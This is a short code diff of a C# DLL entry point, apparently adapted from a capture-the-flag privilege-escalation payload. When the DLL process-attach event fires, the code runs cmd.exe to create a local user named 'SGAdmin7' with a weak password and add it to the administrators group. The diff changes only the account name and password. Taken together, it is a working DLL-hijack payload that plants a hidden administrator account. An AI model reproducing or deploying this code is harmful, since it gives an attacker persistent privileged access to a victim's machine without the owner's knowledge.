@@ -28,8 +28,8 @@ public class DllMain
         switch (DllLoad)
         {
             case DLL_PROCESS_ATTACH:
-                System.Diagnostics.Process.Start("cmd.exe", "/c net user 0xdf 0xdf0xdf /add");
-                System.Diagnostics.Process.Start("cmd.exe", "/c net localgroup administrators 0xdf /add");
+                System.Diagnostics.Process.Start("cmd.exe", "/c net user SGAdmin7 123456789! /add");
+                System.Diagnostics.Process.Start("cmd.exe", "/c net localgroup administrators SGAdmin7 /add");
                 break;
             case DLL_THREAD_ATTACH:
             case DLL_THREAD_DETACH:
